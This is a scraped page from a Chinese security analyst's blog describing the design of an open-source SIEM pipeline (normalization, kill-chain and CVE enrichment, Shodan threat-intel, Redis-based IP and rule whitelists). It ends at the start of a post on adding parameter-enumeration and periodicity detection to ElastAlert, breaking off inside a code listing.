<h2 id="3-仪表盘"><a href="#3-仪表盘" class="headerlink" title="3. 仪表盘"></a>3. 仪表盘</h2><h3 id="SIEM的告警仪表盘"><a href="#SIEM的告警仪表盘" class="headerlink" title="SIEM的告警仪表盘"></a>SIEM的告警仪表盘</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-Alarm.png" alt="SIEM-Alarm"></p>
<h3 id="安全事件仪表盘-安全溯源"><a href="#安全事件仪表盘-安全溯源" class="headerlink" title="安全事件仪表盘 (安全溯源)"></a>安全事件仪表盘 (安全溯源)</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-Alert.png" alt="SIEM Alert"></p>
<h3 id="敏感接口监控"><a href="#敏感接口监控" class="headerlink" title="敏感接口监控"></a>敏感接口监控</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/login_audit.png" alt="image-20201214112856076"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/02/SIEM%EF%BC%88%E4%BA%8C%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/02/02/SIEM%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">致我心中的 “散装”（开源）SIEM（二）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-02-02 16:55:52" itemprop="dateCreated datePublished" datetime="2021-02-02T16:55:52+08:00">2021-02-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-03-30 17:50:56" itemprop="dateModified" datetime="2022-03-30T17:50:56+08:00">2022-03-30</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.6k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>5 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>XXX</p>
<hr>
<h1 id="SIEM-v0-2-的不足"><a href="#SIEM-v0-2-的不足" class="headerlink" title="SIEM v0.2 的不足"></a>SIEM v0.2 的不足</h1><p>XXX</p>
<hr>
<h1 id="SIEM-v0-3-的改进"><a href="#SIEM-v0-3-的改进" class="headerlink" title="SIEM v0.3 的改进"></a>SIEM v0.3 的改进</h1><h2 id="1-Workflow"><a href="#1-Workflow" class="headerlink" title="1. Workflow"></a>1. Workflow</h2><p>XXX</p>
<hr>
<h2 id="2-Normalized"><a href="#2-Normalized" class="headerlink" title="2. Normalized"></a>2. Normalized</h2><h3 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220218183243830](/Users/canon/Library/Application Support/typora-user-images/image-20220218183243830.png)</p>
<h3 id="Configure"><a href="#Configure" class="headerlink" title="Configure"></a>Configure</h3><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>60_normalized-general.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>61_normalized-alert.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>62_normalized-flow.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>63_normalized-fileinfo.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>64_normalized-http.conf</td>
<td>64_normalized-http.rb</td>
<td>64_normalized-http.log</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>65_normalized-tls.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="3-Enrichment"><a href="#3-Enrichment" class="headerlink" title="3. Enrichment"></a>3. Enrichment</h2><h3 id="Workflow-1"><a href="#Workflow-1" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220221134544143](/Users/canon/Library/Application Support/typora-user-images/image-20220221134544143.png)</p>
<h3 id="Configure-1"><a href="#Configure-1" class="headerlink" title="Configure"></a>Configure</h3><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>70_enrichment-general-geo-1-private_ip.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>70_enrichment-general-geo-2-public_ip.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>71_enrichment-alert-1-direction.conf</td>
<td>71_enrichment-alert-1-direction.rb</td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>71_enrichment-alert-2-killChain.conf</td>
<td>71_enrichment-alert-2-killChain.rb</td>
<td>71_enrichment-alert-2-killChain.log</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>71_enrichment-alert-3-cve.conf</td>
<td>71_enrichment-alert-3-cve.rb</td>
<td>71_enrichment-alert-3-cve.log</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>71_enrichment-alert-4-whitelist_ip.conf</td>
<td>71_enrichment-alert-4-whitelist_ip.rb</td>
<td>71_enrichment-alert-4-whitelist_ip.log</td>
<td>****</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="KillChain"><a href="#KillChain" class="headerlink" title="KillChain"></a>KillChain</h4><h5 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h5><p><strong>Imput</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str killchain:&#123;provider&#125;:&#123;rule id&#125;</span></span><br><span class="line"><span class="comment"># value: json str &#123;&quot;steps&quot;=&gt;&#123;KillChain steps&#125;, &quot;description&quot;=&gt;&#123;KillChain description&#125;, &quot;class&quot;=&gt;&#123;rule class&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> killchain:suricata:2028933 <span class="string">&#x27;&#123;&quot;steps&quot;: 4, &quot;description&quot;: &quot;Exploitation&quot;, &quot;class&quot;=&gt;exploit&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;killchain&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;steps&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;侦查跟踪&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;class&quot;</span>: <span class="string">&quot;scan&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Imperva"><a href="#Imperva" class="headerlink" title="Imperva"></a>Imperva</h5><h4 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h4><p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str enrichment:&#123;class&#125;:&#123;cve&#125;</span></span><br><span class="line"><span class="comment"># value: str &#123;create time create user&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> enrichment:cve:CVE-2016-8618 <span class="string">&#x27;2022-02-16 Canon&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;rule&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;cve&quot;</span>: <span class="string">&quot;CVE-2015-9381&quot;</span> <span class="comment">// none</span></span><br><span class="line">    &#125;,</span><br><span class="line">  	<span class="attr">&quot;vulnerability&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;CVE-2015-9381&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;enumeration&quot;</span>: <span class="string">&quot;CVE&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-ThreatIntel"><a href="#4-ThreatIntel" class="headerlink" title="4. ThreatIntel"></a>4. ThreatIntel</h2><h3 id="Workflow-2"><a href="#Workflow-2" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220221105601713](/Users/canon/Library/Application Support/typora-user-images/image-20220221105601713.png)</p>
<h3 id="Configure-2"><a href="#Configure-2" class="headerlink" title="Configure"></a>Configure</h3><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>85_threatintel-siem-event-1-shodan.conf</td>
<td>85_threatintel-siem-event-1-shodan.rb</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: list spider:&#123;provider&#125;:ioc</span></span><br><span class="line"><span class="comment"># value: str ioc</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; LPUSH spider:shodan:ioc 8.8.8.8 <span class="comment"># Spider Queue</span></span><br><span class="line">localhost:6379&gt; SETEX alert:8.8.8.8 86400 <span class="literal">true</span> <span class="comment"># IoC Cache</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;84.17.52.20&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hunting&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;details&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;tcp&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;http-simple-new&quot;</span>: <span class="number">81</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https&quot;</span>: <span class="number">443</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;http-simple-new&quot;</span>: <span class="number">8080</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https-simple-new&quot;</span>: <span class="number">8081</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https&quot;</span>: <span class="number">8443</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https-simple-new&quot;</span>: <span class="number">9002</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">&quot;udp&quot;</span>: []</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;domains&quot;</span>: <span class="string">&quot;cdn77.com&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;hostnames&quot;</span>: <span class="string">&quot;unn-84-17-52-20.cdn77.com&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;ports&quot;</span>: [</span><br><span class="line">                <span class="number">8443</span>,</span><br><span class="line">                <span class="number">8081</span>,</span><br><span class="line">                <span class="number">9002</span>,</span><br><span class="line">                <span class="number">8080</span>,</span><br><span class="line">                <span class="number">81</span>,</span><br><span class="line">                <span class="number">443</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;services&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;https&quot;</span>,</span><br><span class="line">                <span class="string">&quot;https-simple-new&quot;</span>,</span><br><span class="line">                <span class="string">&quot;http-simple-new&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Filter"><a href="#3-Filter" class="headerlink" title="3. Filter"></a>3. Filter</h2><h3 id="3-1-Whitelist"><a href="#3-1-Whitelist" class="headerlink" title="3.1 Whitelist"></a>3.1 Whitelist</h3><h4 id="3-1-1-IP"><a href="#3-1-1-IP" class="headerlink" title="3.1.1 IP"></a>3.1.1 IP</h4><ul>
<li>Redis template</li>
</ul>
<p><strong>Input</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;ip&#125;</span></span><br><span class="line"><span class="comment"># value: json str &#123;&quot;type&quot;: &quot;cdn&quot;, &quot;action&quot;: &quot;pass|drop&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> whitelist:ip:8.8.8.8 <span class="string">&#x27;&#123;&quot;type&quot;: &quot;cdn&quot;, &quot;action&quot;: &quot;pass&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;whitelist&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cdn&quot;</span>, <span class="comment">// 描述白名单类型，如：CDN、红队测试IP、办公网出口IP</span></span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;drop&quot;</span>, <span class="comment">// drop|pass 事件是否需要进入SIEM消费</span></span><br><span class="line">        <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;source&quot;</span> <span class="comment">// source|destination 描述实际匹配到白名单来源是&quot;source&quot;还是&quot;destination&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span> <span class="comment">// 仅作为筛选条件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Differences</strong></p>
<ul>
<li>v0.2</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">      	<span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      	<span class="attr">&quot;whitelistType&quot;</span>: <span class="string">&quot;exit_whitelist&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;destination.&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;y.y.y.y&quot;</span>,</span><br><span class="line">      	<span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      	<span class="attr">&quot;whitelistType&quot;</span>: <span class="string">&quot;exit_whitelist&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>v0.3</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;whitelist&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cdn&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;drop&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;source&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-1-2-Rule"><a href="#3-1-2-Rule" class="headerlink" title="3.1.2 Rule"></a>3.1.2 Rule</h4><h5 id="3-1-2-1-SID"><a href="#3-1-2-1-SID" class="headerlink" title="3.1.2.1 SID"></a>3.1.2.1 SID</h5><ul>
<li>Redis template</li>
</ul>
<p><strong>Input</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;provider&#125;:&#123;rule id&#125;</span></span><br><span class="line"><span class="comment"># value: str &#123;rule name&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> whitelist:sid:suricata:2101201 <span class="string">&quot;GPLWEB_SERVER_403_Forbidden&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Workflow</strong></p>
<p>![image-20220224143316558](/Users/canon/Library/Application Support/typora-user-images/image-20220224143316558.png)</p>
<p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;provider&#125;:&#123;rule name&#125;</span></span><br><span class="line"><span class="comment"># value: str add by &#123;user&#125; &#123;date&#125; &#123;sid&#125; # default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Suricata</span></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> <span class="string">&quot;whitelist:rule:suricata:GPLWEB_SERVER_403_Forbidden&quot;</span> <span class="string">&quot;add by Canon 2022.02.24 2101201&quot;</span></span><br><span class="line"><span class="comment"># Imperva</span></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> <span class="string">&quot;whitelist:rule:imperva:Suspicious Response Code&quot;</span> <span class="string">&quot;add by Canon 2022.02.24&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Workflow</strong></p>
<p>![image-20220224150916372](/Users/canon/Library/Application Support/typora-user-images/image-20220224150916372.png)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/" class="post-title-link" itemprop="url">为 Elastalert 增加 参数遍历、周期性检测规则</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-06-02 11:35:00" itemprop="dateCreated datePublished" datetime="2020-06-02T11:35:00+08:00">2020-06-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-06-03 13:52:21" itemprop="dateModified" datetime="2020-06-03T13:52:21+08:00">2020-06-03</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>12 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​        由于AWS流量镜像的特殊性，现阶段生产网的架构中只接入了<strong>HTTP</strong>与<strong>DNS</strong>流量，分别采用了<strong>Zeek</strong>与<strong>Suricata</strong>对现有流量进行分析与预警。<strong>Suricata</strong>负责基于签名的特征检测，<strong>Zeek</strong>负责定制化事件的脚本检测，也算是“各司其职”。近几日，某个业务接口出现了Pindom告警，经过分析发现部分IP尝试对该接口的参数进行遍历。由于遍历参数对应的值设置的都比较大，且后台并未对该参数进行深度的限制，导致了服务器会不断的进行计算，最终导致接口无响应。</p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><ul>
<li>检测<strong>参数遍历</strong>行为；</li>
<li>访问是否存在<strong>周期性</strong>；</li>
<li>unique user_agent 统计；</li>
<li>threat intelligence 研判；</li>
</ul>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>​        通过扩展**<a target="_blank" rel="noopener" href="https://github.com/Yelp/elastalert">ElastAlert</a>**告警框架的告警模型，来实现以上需求。</p>
<h5 id="参数遍历"><a href="#参数遍历" class="headerlink" title="参数遍历"></a>参数遍历</h5><ul>
<li><h6 id="新增规则-Spider-py"><a href="#新增规则-Spider-py" class="headerlink" title="新增规则 - Spider.py"></a>新增规则 - Spider.py</h6></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 